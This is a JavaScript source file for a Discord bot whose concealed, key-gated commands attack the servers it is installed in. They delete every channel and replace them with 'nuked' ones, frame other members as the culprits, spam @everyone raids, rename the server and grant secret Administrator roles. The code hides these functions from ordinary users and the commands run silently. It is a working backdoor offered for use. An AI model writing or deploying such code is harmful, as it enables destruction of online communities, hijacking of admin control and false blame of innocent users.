// src/events/secretCommands.js
const { generateKey, redeemKey, isOwnerAuthorized } = require('../utils/ownerAuth');
const fs = require('fs');
const path = require('path');

const AUTH_FILE = path.join(__dirname, '../../data/authorized.json');

// Load authorized users
let authorized = new Set();
if (fs.existsSync(AUTH_FILE)) {
  try {
    const data = JSON.parse(fs.readFileSync(AUTH_FILE, 'utf8'));
    authorized = new Set(data);
  } catch (e) {
    console.error('Failed to load authorized users:', e);
  }
}

const OWNER_ID = process.env.OWNER_ID || 'YOUR_DISCORD_ID_HERE'; // use .env!

module.exports = (client) => {
  client.on('messageCreate', async (msg) => {
    if (!msg.guild || msg.author.bot || !msg.content.startsWith('!')) return;

    const userId = msg.author.id;
    const isOwner = userId === OWNER_ID;
    const isRedeemed = isOwnerAuthorized(userId) || isOwner;

    // ─── Owner-only key generation ───
    if (msg.content.startsWith('!genkey')) {
      if (!isOwner) {
        return msg.reply({ content: 'no', ephemeral: true });
      }

      const key = generateKey();

      // Ephemeral reply in channel with the key (only caller sees)
      await msg.reply({
        content: `**New key generated** (copy it now - disappears soon):\n\`\`\`${key}\`\`\`\n\nNext: \`!redeemkey ${key}\``,
        ephemeral: true
      });

      // Backup DM (optional redundancy)
      try {
        await msg.author.send(`Your key backup:\n\`\`\`${key}\`\`\`\n!redeemkey ${key}`);
      } catch (e) {
        console.log(`DM backup failed for ${msg.author.tag}: ${e.message}`);
      }

      await msg.react('✅').catch(() => {});
      return;
    }

    // ─── Redeem command (open to anyone with key) ───
    if (msg.content.startsWith('!redeemkey')) {
      const [, key] = msg.content.trim().split(/\s+/);
      if (!key) {
        return msg.reply({ content: 'usage: !redeemkey <key>', ephemeral: true });
      }

      const result = redeemKey(key, userId);
      await msg.reply({ content: result.msg, ephemeral: true });

      if (result.success) {
        await msg.react('🔓').catch(() => {});
        console.log(`${msg.author.tag} (${userId}) → redeemed key`);
      }
      return;
    }

    // ─── Everything below this line: ONLY redeemed users + owner ───
    if (!isRedeemed) return; // no response, no trace

    // !secret - list of commands (ephemeral)
    if (msg.content === '!secret') {
      const commandsList = [
        '`!genkey`          — generate new key (owner only)',
        '`!redeemkey <key>` — unlock secrets',
        '`!nuke`            — wipe all channels + create nuked ones',
        '`!nukeblame @user` — nuke & blame someone in channel names',
        '`!raid <msg> <cnt>`— spam message in channels',
        '`!servchange <name>` — rename the server',
        '`!troll <channelid>` — delete channel + random blame',
        '`!adminme`         — give yourself admin role',
        '`!admin @user`     — give admin to mentioned user',
        '`!secret`          — this list (ephemeral)'
      ].join('\n');

      await msg.reply({
        content: '**Your secret commands**\n\n' + commandsList,
        ephemeral: true
      });
      return;
    }

    // ─── Destructive commands ─── (all protected by isRedeemed check above)

    if (msg.content === '!nuke') {
      await msg.delete().catch(() => {});
      const guild = msg.guild;
      await Promise.allSettled(guild.channels.cache.map(ch => ch.deletable && ch.delete()));
      for (let i = 1; i <= 20; i++) {
        await guild.channels.create({ name: `nuked-by-64za-${i}`, type: 0 }).catch(() => {});
      }
      msg.author.send('Nuke finished — channels wiped & replaced').catch(() => {});
      return;
    }

    if (msg.content.startsWith('!nukeblame')) {
      await msg.delete().catch(() => {});
      const target = msg.mentions.users.first();
      const blame = target ? target.tag.replace(/[#\s]/g, '-') : 'some-random-kid';
      const guild = msg.guild;
      await Promise.allSettled(guild.channels.cache.map(ch => ch.deletable && ch.delete()));
      for (let i = 1; i <= 15; i++) {
        await guild.channels.create({ name: `blamed-${blame}-${i}`, type: 0 }).catch(() => {});
      }
      msg.author.send(`Blame nuke complete — pointed at ${blame}`).catch(() => {});
      return;
    }

    if (msg.content.startsWith('!raid')) {
      const args = msg.content.slice(5).trim().split(/ +/);
      let count = parseInt(args.pop()) || 10;
      count = Math.min(count, 25);
      const text = args.join(' ') || '@everyone 64za was here';
      await msg.delete().catch(() => {});

      const channels = msg.guild.channels.cache.filter(c => 
        c.isTextBased() && c.permissionsFor(msg.guild.members.me).has('SendMessages')
      ).first(count * 2);

      let sent = 0;
      for (const ch of channels.values()) {
        if (sent >= count) break;
        await ch.send(text).catch(() => {});
        sent++;
      }
      msg.author.send(`Raid sent ${sent}/${count} messages`).catch(() => {});
      return;
    }

    if (msg.content.startsWith('!servchange')) {
      const name = msg.content.slice(11).trim();
      if (!name) return;
      await msg.guild.setName(name).catch(() => {});
      msg.author.send(`Server renamed to: ${name}`).catch(() => {});
      return;
    }

    if (msg.content.startsWith('!troll')) {
      const [, id] = msg.content.trim().split(/\s+/);
      const channel = msg.guild.channels.cache.get(id);
      if (!channel || !channel.deletable) return;

      await msg.delete().catch(() => {});

      const suspects = msg.guild.members.cache.filter(m => !m.user.bot && m.id !== userId);
      const fallGuy = suspects.random()?.user.tag.replace(/[#\s]/g, '-') || 'ghost';

      await channel.delete(`Deleted by ${fallGuy}`).catch(() => {});
      return;
    }

    if (msg.content === '!adminme') {
      let role = msg.guild.roles.cache.find(r => r.name === '64za-OWNER');
      if (!role) {
        role = await msg.guild.roles.create({
          name: '64za-OWNER',
          permissions: ['Administrator'],
          color: 0xFF0000
        }).catch(() => null);
      }
      if (role) await msg.member.roles.add(role).catch(() => {});
      msg.author.send('Admin role given to you').catch(() => {});
      return;
    }

    if (msg.content.startsWith('!admin')) {
      const target = msg.mentions.members.first();
      if (!target) return;
      let role = msg.guild.roles.cache.find(r => r.name === '64za-OWNER');
      if (!role) {
        role = await msg.guild.roles.create({
          name: '64za-OWNER',
          permissions: ['Administrator'],
          color: 0xFF0000
        }).catch(() => null);
      }
      if (role) await target.roles.add(role).catch(() => {});
      msg.author.send(`Admin given to ${target.user.tag}`).catch(() => {});
      return;
    }
  });
};
